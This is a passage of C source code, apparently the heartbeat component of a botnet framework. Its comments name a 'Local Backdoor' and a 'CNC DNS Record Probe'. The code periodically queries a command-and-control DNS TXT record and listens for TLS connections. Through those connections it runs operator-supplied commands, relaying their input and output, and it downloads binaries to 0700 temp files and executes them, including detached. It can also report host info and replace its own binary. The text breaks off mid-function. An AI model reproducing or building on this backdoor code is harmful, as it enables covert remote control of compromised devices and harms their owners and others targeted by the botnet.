#include "htbt.h"
#include "util_rt.h"
#include "protocol.h"
#include "llist.h"
#include "pth.h"
#include "endian.h"
#include "mbedtls.h"
#include "iobuf.h"

#include <string.h>
#include <errno.h>

#include <fcntl.h>
#include <poll.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

// CNCP interval: HTBT_CNCP_INT_MIN + variance
// #define HTBT_CNCP_INT_MIN	1800000 // half an hour minimum interval
// #define HTBT_CNCP_INT_VAR	1800000 // half an hour variance
// TODO
#define HTBT_CNCP_INT_MIN	59000
#define HTBT_CNCP_INT_VAR	2000
#define HTBT_LBD_PORT		prne_htobe16(PRNE_HTBT_PROTO_PORT)
#define HTBT_LBD_BACKLOG	4
// Slave Socket Operation Timeout
static const struct timespec HTBT_SLV_SCK_OP_TIMEOUT = { 10, 0 }; // 10s
// Slave Status Send Timeout
static const struct timespec HTBT_SLV_STATUS_SND_TIMEOUT = { 5, 0 }; // 5s
// LBD Socket Bind Retry Interval
static const struct timespec HTBT_LBD_BIND_INT = { 5, 0 }; // 5s
// TLS Close Timeout
static const struct timespec HTBT_CLOSE_TIMEOUT = { 3, 0 }; // 3s
// Relay child Timeout
static const struct timespec HTBT_RELAY_CHILD_TIMEOUT = { 60, 0 }; // 60s
// Download tick timeout
static const struct timespec HTBT_DL_TICK_TIMEOUT = { 30, 0 }; // 30s

typedef struct {
	int fd[2];
	prne_iobuf_t iobuf[2];
	void *ioctx;
	bool (*setup_f)(void *ioctx, pth_event_t ev);
	void (*cleanup_f)(void *ioctx, pth_event_t ev);
	int (*read_f)(void *ioctx, void *buf, const size_t len);
	int (*write_f)(void *ioctx, const void *buf, const size_t len);
	const prne_htbt_cbset_t *cbset;
	prne_pth_cv_t cv;
	size_t skip;
	bool valid; // TODO: set to false on exit
} htbt_slv_ctx_t;

typedef struct {
	pth_t pth;
	htbt_slv_ctx_t slv;
	mbedtls_ssl_context ssl;
	int fd;
} htbt_lbd_client_t;

typedef struct {
	pth_mutex_t lock;
	pth_cond_t cond;
	prne_htbt_op_t op;
	void *req_body; // NULL if abandoned
	prne_htbt_status_t rsp;
} htbt_req_slip_t;

struct prne_htbt {
	prne_htbt_param_t param;
	pth_mutex_t lock;
	pth_cond_t cond;
	bool loop_flag;
	struct { // Main
		prne_llist_t req_q;
	} main;
	struct { // CNC DNS Record Probe
		pth_t pth;
		pth_mutex_t lock;
		pth_cond_t cond;
	} cncp;
	struct { // Local Backdoor
		pth_t pth;
		int fd;
		prne_llist_t conn_list;
	} lbd;
};

#define HTBT_INTP_CTX(x) prne_htbt_t *ctx = (prne_htbt_t*)(x);

static void fin_htbt_wkr (void *p) {
	HTBT_INTP_CTX(p);

	ctx->loop_flag = false;
	prne_pth_cv_notify(&ctx->lock, &ctx->cond, true);
	prne_pth_cv_notify(&ctx->cncp.lock, &ctx->cncp.cond, false);
}

static void free_htbt_wkr_ctx (void *p) {
	HTBT_INTP_CTX(p);

	// TODO

	prne_free_llist(&ctx->main.req_q);
	pth_abort(ctx->cncp.pth);

	pth_abort(ctx->lbd.pth);
	prne_close(ctx->lbd.fd);
	prne_free_llist(&ctx->lbd.conn_list);

	prne_free(p);
}

static void *htbt_main_entry (void *p) {
	HTBT_INTP_CTX(p);

	prne_assert(pth_resume(ctx->lbd.pth));
	prne_assert(pth_resume(ctx->cncp.pth));

	// TODO
	while (ctx->loop_flag) {
		pth_mutex_acquire(&ctx->lock, FALSE, NULL);
		pth_cond_await(&ctx->cond, &ctx->lock, NULL);
		pth_mutex_release(&ctx->lock);
	}

	prne_close(ctx->lbd.fd);
	ctx->lbd.fd = -1;

	prne_assert(pth_join(ctx->lbd.pth, NULL));
	prne_assert(pth_join(ctx->cncp.pth, NULL));
	ctx->lbd.pth = NULL;
	ctx->cncp.pth = NULL;

	return NULL;
}

static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
	prne_resolv_prm_t prm;
	bool r_ret;
	prne_pth_cv_t cv;
	char txtrec[256];

	prne_resolv_init_prm(&prm);
	cv.lock = &ctx->cncp.lock;
	cv.cond = &ctx->cncp.cond;
	cv.broadcast = false;

	if (!ctx->param.cb_f.cnc_txtrec(txtrec)) {
		goto END;
	}
	txtrec[255] = 0;
	r_ret = prne_resolv_prm_gettxtrec(
		ctx->param.resolv,
		txtrec,
		&cv,
		&prm);
	if (!r_ret) {
		goto END;
	}

	pth_mutex_acquire(cv.lock, FALSE, NULL);
	pth_cond_await(cv.cond, cv.lock, NULL);
	pth_mutex_release(cv.lock);

	if (prm.fut->qr == PRNE_RESOLV_QR_OK && prm.fut->rr_cnt > 0) {
		// Scrub off the name
		for (size_t i = 0; i < prm.fut->rr_cnt; i += 1) {
			prne_memzero(prm.fut->rr[i].name, strlen(prm.fut->rr[i].name));
		}
		// TODO
		// <entries in hex> <txt rec name suffix>
	}

END:
	prne_memzero(txtrec, sizeof(txtrec));
	prne_resolv_free_prm(&prm);
}

static void *htbt_cncp_entry (void *p) {
	HTBT_INTP_CTX(p);
	unsigned long intvar;
	pth_event_t ev = NULL;

	while (ctx->loop_flag) {
		htbt_cncp_do_probe(ctx);

		// calc interval variance
		intvar = 0; // ignore failure of mbedtls_ctr_drbg_random()
		mbedtls_ctr_drbg_random(
			ctx->param.ctr_drbg,
			(unsigned char*)&intvar,
			sizeof(intvar));
		intvar = HTBT_CNCP_INT_MIN + (intvar % HTBT_CNCP_INT_VAR);
		pth_event_free(ev, FALSE);
		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(prne_ms_timespec(intvar)));

		// wait
		prne_assert(ev != NULL); // fatal without timeout
		pth_mutex_acquire(&ctx->lock, FALSE, NULL);
		pth_cond_await(&ctx->cond, &ctx->lock, ev);
		pth_mutex_release(&ctx->lock);
		if (!ctx->loop_flag) {
			break;
		}
	}

	pth_event_free(ev, FALSE);
	return NULL;
}

/**/

/* htbt_relay_child()
*/
static prne_htbt_status_code_t htbt_relay_child (
	htbt_slv_ctx_t *ctx,
	const uint16_t msg_id,
	int *c_in,
	int *c_out,
	int *c_err)
{
	prne_htbt_status_code_t ret = PRNE_HTBT_STATUS_OK;
	struct pollfd pfd[5];
	prne_htbt_msg_head_t mh;
	prne_htbt_stdio_t sh[2];
	int f_ret, pending, out_p = 0;
	size_t actual;
	ssize_t consume;
	pth_event_t ev = NULL;

	pfd[0].fd = ctx->fd[0];
	pfd[1].fd = ctx->fd[1];
	pfd[2].fd = *c_in;
	pfd[3].fd = *c_out;
	pfd[4].fd = *c_err;
	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_stdio(sh + 0);
	prne_htbt_init_stdio(sh + 1);

	while ((!sh[0].fin && sh[0].len > 0) || // has pending stdin data
		ctx->iobuf[1].len > 0 || // has pending stdout data
		pfd[3].fd >= 0 || // child stdout is still open
		pfd[4].fd >= 0) // child stdout is still open
	{
		// Setup events
		if (ctx->iobuf[0].avail > 0 && !(sh[0].fin && sh[0].len == 0)) {
			pfd[0].events = POLLIN;
		}
		else {
			pfd[0].events = 0;
		}

		pfd[1].events = ctx->iobuf[1].len > 0 ? POLLOUT : 0;

		if (sh[0].len > 0 && ctx->iobuf[0].len > 0) {
			pfd[2].events = POLLOUT;
		}
		else {
			pfd[2].events = 0;
		}

		pfd[3].events = 0;
		pfd[4].events = 0;
		if (ctx->iobuf[1].len == 0) {
			if (pfd[3 + out_p].fd < 0) {
				out_p = (out_p + 1) % 2;
			}
			pfd[3 + out_p].events = POLLIN;
		}

		pth_event_free(ev, FALSE);
		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(HTBT_RELAY_CHILD_TIMEOUT));
		prne_assert(ev != NULL);

		// Do poll
		f_ret = pth_poll_ev(pfd, 5, -1, ev);
		if (f_ret < 0 && errno != EINTR) {
			ret = PRNE_HTBT_STATUS_ERRNO;
			break;
		}
		if (pth_event_status(ev) == PTH_STATUS_OCCURRED || f_ret == 0) {
			ret = PRNE_HTBT_STATUS_TIMEDOUT;
			break;
		}

		// Handle events
		if (!sh[0].fin && sh[0].len == 0) {
			do {
				if (prne_htbt_dser_msg_head(
					ctx->iobuf[0].m,
					ctx->iobuf[0].len,
					&actual,
					&mh) != PRNE_HTBT_SER_RC_OK)
				{
					break;
				}
				consume = actual;
				if (mh.id != msg_id ||
					mh.is_rsp ||
					mh.op != PRNE_HTBT_OP_STDIO)
				{
					sh[0].fin = true;
					break;
				}
				if (prne_htbt_dser_stdio(
					ctx->iobuf[0].m + consume,
					ctx->iobuf[0].len - consume,
					&actual,
					sh + 0) != PRNE_HTBT_SER_RC_OK)
				{
					break;
				}
				consume += actual;
				prne_iobuf_shift(ctx->iobuf + 0, -consume);
			} while (false);
		}

		if (pfd[0].revents & POLLIN) {
			f_ret = ctx->read_f(
				ctx->ioctx,
				ctx->iobuf[0].m + ctx->iobuf[0].len,
				ctx->iobuf[0].avail);
			if (f_ret == 0) {
				pfd[0].fd = -1;
				if (sh[0].len > 0) {
					// There's still pending stdin data and EOF.
					// This is proto err.
					ret = PRNE_HTBT_STATUS_PROTO_ERR;
					break;
				}
			}
			else if (f_ret < 0) {
				ctx->valid = false;
				break;
			}
			else {
				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
			}
		}

		if (pfd[1].revents & POLLOUT) {
			f_ret = ctx->write_f(
				ctx->ioctx,
				ctx->iobuf[1].m,
				ctx->iobuf[1].len);
			if (f_ret <= 0) {
				ctx->valid = false;
				break;
			}
			else {
				prne_iobuf_shift(ctx->iobuf + 1, -f_ret);
				if (pending > 0) {
					pending -= f_ret;
				}
				else {
					sh[1].len -= f_ret;
					if (sh[1].len == 0) {
						out_p = (out_p + 1) % 2;
					}
				}
			}
		}

		consume = prne_op_min(ctx->iobuf[0].len, sh[0].len);
		if (pfd[2].fd < 0 && sh[0].len > 0) {
			// Stdin data coming in, but the child has already closed stdin
			prne_iobuf_shift(ctx->iobuf + 0, -consume);
			sh[0].len -= consume;
		}
		else if (pfd[2].revents) {
			f_ret = write(*c_in, ctx->iobuf[0].m, consume);
			if (f_ret > 0) {
				consume = f_ret;
			}
			else {
				pfd[2].fd = -1;
			}

			prne_iobuf_shift(ctx->iobuf + 0, -consume);
			sh[0].len -= consume;
		}

		if (sh[0].fin && sh[0].len == 0 && pfd[2].fd >= 0) {
			// End of stdin stream
			close(*c_in);
			*c_in = -1;
			pfd[2].fd = -1;
		}

		if (pfd[3 + out_p].revents) {
			if (sh[1].len == 0) {
/*
* FIONREAD is not standardised. On platforms where it's not supported, ioctl()
* fails or pending is always 0. The former case is fatal. The latter case
* results in a weird bug.
*/
				prne_assert(ioctl(pfd[3 + out_p].fd, FIONREAD, &pending) == 0);

				sh[1].len = (size_t)prne_op_min(
					pending,
					PRNE_HTBT_STDIO_LEN_MAX);
				sh[1].err = out_p != 0;
				sh[1].fin = sh[1].len == 0;
				mh.id = msg_id;
				mh.is_rsp = true;
				mh.op = PRNE_HTBT_OP_STDIO;

				prne_assert(prne_htbt_ser_msg_head(
					ctx->iobuf[1].m + ctx->iobuf[1].len,
					ctx->iobuf[1].avail,
					&actual,
					&mh) == PRNE_HTBT_SER_RC_OK);
				pending = (int)actual;
				prne_assert(prne_htbt_ser_stdio(
					ctx->iobuf[1].m + ctx->iobuf[1].len + pending,
					ctx->iobuf[1].avail - pending,
					&actual,
					sh + 1) == PRNE_HTBT_SER_RC_OK);
				pending += (int)actual;
				prne_iobuf_shift(ctx->iobuf + 1, pending);

				if (sh[1].fin) {
					pfd[3 + out_p].fd = -1;
				}
			}
			else {
				f_ret = read(
					pfd[3 + out_p].fd,
					ctx->iobuf[1].m + ctx->iobuf[1].len,
					prne_op_min(sh[1].len, ctx->iobuf[1].avail));
				prne_dbgast(f_ret > 0);
				prne_iobuf_shift(ctx->iobuf + 1, f_ret);
			}
		}
	}

	prne_htbt_free_stdio(sh + 0);
	prne_htbt_free_stdio(sh + 1);
	prne_htbt_free_msg_head(&mh);
	pth_event_free(ev, FALSE);

	return ret;
}

/* htbt_do_cmd()
*
* Give flushed output buffer.
*/
static void htbt_do_cmd (
	const bool detach,
	char *const *args,
	htbt_slv_ctx_t *ctx,
	const uint16_t msg_id,
	prne_htbt_status_code_t *out_status,
	int32_t *out_err)
{
	int cin[2] = { -1, -1 };
	int cout[2] = { -1, -1 };
	int cerr[2] = { -1, -1 };
	int errp[2] = { -1, -1 };
	pid_t child = -1;
	int f_ret, chld_status;
	prne_htbt_status_code_t ret_status;
	int32_t ret_err = 0;

	if (pipe(errp) != 0 ||
		fcntl(errp[0], F_SETFD, FD_CLOEXEC) != 0 ||
		fcntl(errp[1], F_SETFD, FD_CLOEXEC) != 0)
	{
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_err = errno;
		goto END;
	}
	if (!detach &&
		(pipe(cin) != 0 || pipe(cout) != 0 || pipe(cerr) != 0))
	{
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_err = errno;
		goto END;
	}

	child = pth_fork();
	if (child == 0) {
		do { // TRY
			close(errp[0]);

			if (detach) {
				child = fork();
				if (child < 0) {
					break;
				}
				else if (child > 0) {
					exit(0);
				}

				setsid();
				close(STDIN_FILENO);
				// Inherit these if DEBUG
#if !defined(PRNE_DEBUG)
				close(STDOUT_FILENO);
				close(STDERR_FILENO);
#endif
			}
			else {
				close(cin[1]);
				close(cout[0]);
				close(cerr[0]);
				if (prne_chfd(cin[0], STDIN_FILENO) != STDIN_FILENO ||
					prne_chfd(cout[1], STDOUT_FILENO) != STDOUT_FILENO ||
					prne_chfd(cerr[1], STDERR_FILENO) != STDERR_FILENO)
				{
					break;
				}
			}

			execv(args[0], args);
		} while (false);
		// CATCH
		ret_err = errno;
		write(errp[1], &ret_err, sizeof(int32_t));
		raise(SIGKILL);
	}
	else if (child < 0) {
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_err = errno;
		goto END;
	}

	// The parent continues ...
	close(errp[1]);

	// This could block forever if the child gets stoppep
	f_ret = pth_read(errp[0], &ret_err, sizeof(int32_t));
	if (f_ret == sizeof(int32_t)) {
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		goto END;
	}
	prne_close(errp[0]);
	errp[0] = -1;

	ret_status = PRNE_HTBT_STATUS_OK;
	if (detach) {
		if (pth_waitpid(child, &chld_status, WUNTRACED) == child &&
			!WIFSTOPPED(chld_status))
		{
			child = -1;
			ret_err = 0;
		}
	}
	else {
		prne_close(cin[0]);
		prne_close(cout[1]);
		prne_close(cerr[1]);
		cin[0] = cout[1] = cerr[1] = errp[1] = -1;
		if (!prne_sck_fcntl(cin[1]) ||
			!prne_sck_fcntl(cout[0]) ||
			!prne_sck_fcntl(cerr[0]))
		{
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_err = errno;
			goto END;
		}

		ret_status = htbt_relay_child(
			ctx,
			msg_id,
			&cin[1],
			&cout[0],
			&cerr[0]);
		if (ret_status != PRNE_HTBT_STATUS_OK) {
			if (ret_status == PRNE_HTBT_STATUS_ERRNO) {
				ret_err = errno;
			}
			goto END;
		}

		if (pth_waitpid(child, &chld_status, WUNTRACED) < 0) {
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_err = errno;
			goto END;
		}
		else if (WIFEXITED(chld_status)) {
			ret_err = WEXITSTATUS(chld_status);
			child = -1;
		}
		else if (WIFSIGNALED(chld_status)) {
			ret_err = 128 + WTERMSIG(chld_status);
			child = -1;
		}
		else if (WIFSTOPPED(chld_status)) {
			// child has been stopped just right before exit
			ret_err = 128 + SIGSTOP;
		}
		else {
			ret_err = -1; // WTF?
		}
	}

END:
	prne_close(cin[0]);
	prne_close(cin[1]);
	prne_close(cout[0]);
	prne_close(cout[1]);
	prne_close(cerr[0]);
	prne_close(cerr[1]);
	prne_close(errp[0]);
	prne_close(errp[1]);
	if (child > 0) {
		kill(child, SIGKILL);
		pth_waitpid(child, NULL, 0);
	}

	if (out_status != NULL) {
		*out_status = ret_status;
	}
	if (out_err != NULL) {
		*out_err = ret_err;
	}
}

static void htbt_slv_consume_outbuf (
	htbt_slv_ctx_t *ctx,
	const size_t req_size,
	pth_event_t root_ev)
{
	struct pollfd pfd;
	int fret;

	pfd.fd = ctx->fd[1];
	pfd.events = POLLOUT;

	while (ctx->valid && ctx->iobuf[1].len > 0) {
		fret = pth_poll_ev(&pfd, 1, -1, root_ev);
		if (root_ev != NULL &&
			pth_event_status(root_ev) != PTH_STATUS_PENDING)
		{
			break;
		}
		if (fret == 1 && pfd.revents & POLLOUT) {
			fret = ctx->write_f(
				ctx->ioctx,
				ctx->iobuf[1].m,
				ctx->iobuf[1].len);
			if (fret <= 0) {
				ctx->valid = false;
				break;
			}
			prne_iobuf_shift(ctx->iobuf + 1, -fret);
		}
		else {
			break;
		}

		if (ctx->iobuf[1].avail >= req_size) {
			break;
		}
	}
}

static void htbt_slv_fab_frame (
	htbt_slv_ctx_t *ctx,
	const prne_htbt_msg_head_t *mh,
	const void *body,
	prne_htbt_ser_ft ser_f,
	pth_event_t ev)
{
	size_t req, actual;

	prne_assert(ev != NULL);

	req = 0;
	prne_htbt_ser_msg_head(NULL, 0, &actual, mh);
	req += actual;
	ser_f(NULL, 0, &actual, body);
	req += actual;

	prne_assert(req <= ctx->iobuf[1].size);
	htbt_slv_consume_outbuf(ctx, req, ev);

	prne_htbt_ser_msg_head(
		ctx->iobuf[1].m + ctx->iobuf[1].len,
		ctx->iobuf[1].avail,
		&actual,
		mh);
	prne_iobuf_shift(ctx->iobuf + 1, actual);
	ser_f(
		ctx->iobuf[1].m + ctx->iobuf[1].len,
		ctx->iobuf[1].avail,
		&actual,
		body);
	prne_iobuf_shift(ctx->iobuf + 1, actual);
}

static void htbt_slv_fab_status (
	htbt_slv_ctx_t *ctx,
	prne_htbt_status_code_t status,
	int32_t err,
	uint16_t corr_msgid,
	pth_event_t ev)
{
	prne_htbt_msg_head_t mh;
	prne_htbt_status_t s;
	pth_event_t my_ev = NULL;

	if (ev == NULL) {
		my_ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(HTBT_SLV_STATUS_SND_TIMEOUT));
		ev = my_ev;
	}
	prne_assert(ev != NULL);

	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_status(&s);
	mh.id = corr_msgid;
	mh.is_rsp = true;
	mh.op = PRNE_HTBT_OP_STATUS;
	s.code = status;
	s.err = err;

	htbt_slv_fab_frame(
		ctx,
		&mh,
		&s,
		(prne_htbt_ser_ft)prne_htbt_ser_status,
		ev);

	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_status(&s);
	pth_event_free(my_ev, FALSE);
}

static void htbt_slv_raise_protoerr (
	htbt_slv_ctx_t *ctx,
	uint16_t corr_msgid,
	int32_t err)
{
	pth_event_t ev = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(HTBT_SLV_STATUS_SND_TIMEOUT));

	prne_assert(ev != NULL);
	htbt_slv_fab_status(
		ctx,
		PRNE_HTBT_STATUS_PROTO_ERR,
		err,
		corr_msgid,
		ev);
	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, ev);
	ctx->valid = false;

	pth_event_free(ev, FALSE);
}

static bool htbt_slv_srv_stdio (
	htbt_slv_ctx_t *ctx,
	pth_event_t root_ev,
	size_t off,
	const prne_htbt_msg_head_t *mh)
{
	bool ret = true;
	prne_htbt_stdio_t sh;
	size_t actual;
	prne_htbt_ser_rc_t s_ret;

	prne_htbt_init_stdio(&sh);

	s_ret = prne_htbt_dser_stdio(
		ctx->iobuf[0].m + off,
		ctx->iobuf[0].len - off,
		&actual,
		&sh);
	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
		ret = false;
		goto END;
	}
	else {
		prne_iobuf_shift(ctx->iobuf + 0, -(off + actual));
	}
	if (s_ret != PRNE_HTBT_SER_RC_OK) {
		htbt_slv_raise_protoerr(
			ctx,
			mh->id,
			0);
		goto END;
	}

	ctx->skip = sh.len;
END:
	prne_htbt_free_stdio(&sh);

	return ret;
}

static void htbt_slv_srv_hostinfo (
	htbt_slv_ctx_t *ctx,
	pth_event_t root_ev,
	size_t off,
	const prne_htbt_msg_head_t *mh)
{
	prne_htbt_host_info_t hi;

	prne_iobuf_shift(ctx->iobuf + 0, -off);

	if (ctx->cbset->hostinfo == NULL) {
		htbt_slv_fab_status(
			ctx,
			PRNE_HTBT_STATUS_UNIMPL,
			0,
			mh->id,
			root_ev);
		return;
	}

	prne_htbt_init_host_info(&hi);

	if (ctx->cbset->hostinfo(&hi)) {
		htbt_slv_fab_frame(
			ctx,
			mh,
			&hi,
			(prne_htbt_ser_ft)prne_htbt_ser_host_info,
			root_ev);
	}
	else {
		htbt_slv_fab_status(
			ctx,
			PRNE_HTBT_STATUS_ERRNO,
			errno,
			mh->id,
			root_ev);
	}

	prne_htbt_free_host_info(&hi);
}

static bool htbt_slv_srv_run_cmd (
	htbt_slv_ctx_t *ctx,
	pth_event_t root_ev,
	size_t off,
	const prne_htbt_msg_head_t *mh)
{
	bool ret = true;
	size_t actual;
	prne_htbt_ser_rc_t s_ret;
	prne_htbt_cmd_t cmd;
	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_ERRNO;
	int32_t err = 0;

	prne_htbt_init_cmd(&cmd);

	s_ret = prne_htbt_dser_cmd(
		ctx->iobuf[0].m + off,
		ctx->iobuf[0].len - off,
		&actual,
		&cmd);
	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
		ret = false;
		goto END;
	}
	else {
		prne_iobuf_shift(ctx->iobuf + 0, -(off + actual));
	}
	if (s_ret == PRNE_HTBT_SER_RC_ERRNO) {
		htbt_slv_fab_status(
			ctx,
			PRNE_HTBT_STATUS_ERRNO,
			errno,
			mh->id,
			root_ev);
		goto END;
	}
	if (s_ret != PRNE_HTBT_SER_RC_OK) {
		htbt_slv_raise_protoerr(ctx, mh->id, 0);
		goto END;
	}

	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
	if (root_ev != NULL && pth_event_status(root_ev) == PTH_STATUS_PENDING) {
		htbt_do_cmd(cmd.detach, cmd.args, ctx, mh->id, &status, &err);
		htbt_slv_fab_status(ctx, status, err, mh->id, NULL);
	}

END:
	prne_htbt_free_cmd(&cmd);
	return ret;
}

static bool htbt_slv_srv_bin (
	htbt_slv_ctx_t *ctx,
	pth_event_t root_ev,
	size_t off,
	const prne_htbt_msg_head_t *mh)
{
	bool ret = true;
	prne_htbt_bin_meta_t bin_meta;
	size_t actual;
	prne_htbt_ser_rc_t s_ret;
	char *path = NULL;
	char **args = NULL;
	int fd = -1, f_ret;
	struct pollfd pfd;
	pth_event_t ev = NULL;
	prne_htbt_status_code_t ret_status = PRNE_HTBT_STATUS_OK;
	int32_t ret_errno = 0;

	prne_dbgast(
		mh->op == PRNE_HTBT_OP_RUN_BIN ||
		mh->op == PRNE_HTBT_OP_NY_BIN);

	prne_htbt_init_bin_meta(&bin_meta);

	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);

	s_ret = prne_htbt_dser_bin_meta(
		ctx->iobuf[0].m + off,
		ctx->iobuf[0].len - off,
		&actual,
		&bin_meta);
	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
		ret = false;
		goto END;
	}
	else {
		off += actual;
		prne_iobuf_shift(ctx->iobuf + 0, -off);
	}
	if (s_ret != PRNE_HTBT_SER_RC_OK) {
		goto PROTO_ERR;
	}

	if (ctx->cbset->tmpfile == NULL ||
		(mh->op == PRNE_HTBT_OP_NY_BIN && ctx->cbset->ny_bin == NULL)) {
		ret_status = PRNE_HTBT_STATUS_UNIMPL;
		goto SND_STATUS;
	}

	errno = 0;
	path = ctx->cbset->tmpfile(bin_meta.bin_size, 0700);
	if (path == NULL) {
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_errno = errno;
		goto SND_STATUS;
	}

	fd = open(path, O_WRONLY);
	if (fd < 0) {
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_errno = errno;
		goto SND_STATUS;
	}
	fcntl(fd, F_SETFD, FD_CLOEXEC);

	pfd.fd = ctx->fd[0];
	pfd.events = POLLIN;
	while (bin_meta.bin_size > 0) {
		pth_event_free(ev, FALSE);
		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(HTBT_DL_TICK_TIMEOUT));
		prne_assert(ev != NULL);

		if (ctx->iobuf[0].len == 0) {
			f_ret = pth_poll_ev(&pfd, 1, -1, ev);
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED ||
				f_ret == 0)
			{
				ret_status = PRNE_HTBT_STATUS_ERRNO;
				ret_errno = ETIMEDOUT;
				goto SND_STATUS;
			}

			if (pfd.revents & POLLIN) {
				f_ret = ctx->read_f(
					ctx->ioctx,
					ctx->iobuf[0].m,
					ctx->iobuf[0].avail);
				if (f_ret <= 0) {
					if (f_ret < 0) {
						ctx->valid = false;
					}
					goto PROTO_ERR;
				}
				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
			}
			else if (pfd.revents) {
				goto END;
			}
		}

		actual = prne_op_min(bin_meta.bin_size, ctx->iobuf[0].len);
		// This blocks!
		f_ret = write(fd, ctx->iobuf[0].m, actual);
		prne_iobuf_shift(ctx->iobuf + 0, -actual);
		bin_meta.bin_size -= actual;
		if (f_ret < 0) {
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_errno = errno;
			goto SND_STATUS;
		}
	}
	close(fd);
	fd = -1;

	if (mh->op == PRNE_HTBT_OP_RUN_BIN) {
		char *add_args[1] = { path };

		args = prne_htbt_parse_args(
			bin_meta.cmd.mem,
			bin_meta.cmd.mem_len,
			1,
			add_args,
			NULL,
			SIZE_MAX);
		if (args == NULL) {
			goto END;
		}

		htbt_do_cmd(
			bin_meta.cmd.detach,
			args,
			ctx,
			mh->id,
			&ret_status,
			&ret_errno);
	}
	else {
		if (!ctx->cbset->ny_bin(path, &bin_meta.cmd)) {
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_errno = errno;
			goto SND_STATUS;
		}
		path[0] = 0;
	}

	goto SND_STATUS;
PROTO_ERR:
	htbt_slv_raise_protoerr(ctx, mh->id, 0);
	goto END;
SND_STATUS:
	htbt_slv_fab_status(
		ctx,
		ret_status,
		ret_errno,
		mh->id,
		NULL);
	goto END;
END:
	ctx->skip = bin_meta.bin_size;
	prne_htbt_free_bin_meta(&bin_meta);
	if (path[0] != 0) {
		unlink(path);
	}
	prne_free(path);
	prne_free(args);
	prne_close(fd);
	pth_event_free(ev, FALSE);

	return ret;
}

static void htbt_slv_skip_inbuf (htbt_slv_ctx_t *ctx) {
	size_t consume;

	if (ctx->skip == 0) {
		return;
	}
	consume = prne_op_min(ctx->iobuf[0].len, ctx->skip);

	prne_iobuf_shift(
		ctx->iobuf + 0,
		-consume);
	ctx->skip -= consume;
}

static bool htbt_slv_consume_inbuf (
	htbt_slv_ctx_t *ctx,
	pth_event_t root_ev)
{
	prne_htbt_ser_rc_t s_ret;
	prne_htbt_msg_head_t f_head;
	size_t actual;
	bool ret = true;

	while (ret && ctx->valid) {
		prne_htbt_free_msg_head(&f_head);
		prne_htbt_init_msg_head(&f_head);

		s_ret = prne_htbt_dser_msg_head(
			ctx->iobuf[0].m,
			ctx->iobuf[0].len,
			&actual,
			&f_head);
		if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
			ret = false;
			break;
		}
		if (s_ret != PRNE_HTBT_SER_RC_OK ||
			f_head.is_rsp ||
			(f_head.op != PRNE_HTBT_OP_NOOP && f_head.id == 0))
		{
			htbt_slv_raise_protoerr(ctx, f_head.id, 0);
			goto END;
		}

		f_head.is_rsp = true;
		switch (f_head.op) {
		case PRNE_HTBT_OP_NOOP:
			prne_iobuf_shift(ctx->iobuf + 0, -actual);
			break;
		case PRNE_HTBT_OP_STDIO:
			ret = htbt_slv_srv_stdio(ctx, root_ev, actual, &f_head);
			break;
		case PRNE_HTBT_OP_HOST_INFO:
			htbt_slv_srv_hostinfo(ctx, root_ev, actual, &f_head);
			break;
		case PRNE_HTBT_OP_RUN_CMD:
			ret = htbt_slv_srv_run_cmd(ctx, root_ev, actual, &f_head);
			break;
		case PRNE_HTBT_OP_RUN_BIN:
		case PRNE_HTBT_OP_NY_BIN:
			ret = htbt_slv_srv_bin(ctx, root_ev, actual, &f_head);
			break;
		case PRNE_HTBT_OP_HOVER:
		default:
			htbt_slv_raise_protoerr(ctx, f_head.id, PRNE_HTBT_STATUS_UNIMPL);
			goto END;
		}

		htbt_slv_skip_inbuf(ctx);
	}

END:
	prne_htbt_free_msg_head(&f_head);

	return ret;
}

static void *htbt_slv_entry (void *p) {
	htbt_slv_ctx_t *ctx = (htbt_slv_ctx_t*)p;
	int f_ret;
	pth_event_t ev_timeout, ev_root = NULL;
	struct pollfd pfd[2];

	ev_timeout = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
	prne_assert(ev_timeout != NULL);
	if (!ctx->setup_f(ctx->ioctx, ev_timeout)) {
		goto END;
	}

	pfd[0].fd = ctx->fd[0];
	pfd[1].fd = ctx->fd[1];
	while (ctx->valid) {
		if (ev_timeout == NULL) {
			ev_timeout = pth_event(
				PTH_EVENT_TIME,
				prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
			prne_assert(ev_timeout != NULL);
		}
		pth_event_free(ev_root, FALSE);

		if (ctx->iobuf[1].len > 0) {
			pfd[0].events = 0;
			pfd[1].events = POLLOUT;
			ev_root = pth_event(
				PTH_EVENT_FD | PTH_UNTIL_FD_WRITEABLE | PTH_UNTIL_FD_EXCEPTION,
				ctx->fd[1]);
		}
		else {
			pfd[0].events = POLLIN;
			pfd[1].events = 0;
